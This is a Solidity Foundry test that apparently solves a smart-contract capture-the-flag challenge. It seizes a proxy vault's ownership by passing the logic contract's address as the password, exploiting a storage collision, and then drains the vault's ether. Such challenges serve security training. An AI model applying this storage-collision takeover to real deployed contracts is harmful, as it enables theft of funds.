//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./greeterVault.sol";

contract ContractTest is Test {
    SetUp public setup;
    VaultLogic public logic;
    Vault public vault;


    function testExp() public {
        deal(address(this), 3 ether);
        setup = new SetUp{value: 1 ether}(bytes32(hex"7465737412340000000000000000000000000000000000000000000000000000"));
        logic = VaultLogic(setup.logic());
        vault = Vault(setup.vault());

        address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                bytes32(uint256(uint160(address(logic)))),
                address(this)
            )
        );

        console.log(vault.owner());

        address(vault).call(
            abi.encodeWithSignature("withdraw()")
        );

        require(setup.isSolved());
    }

    receive() external payable {}
}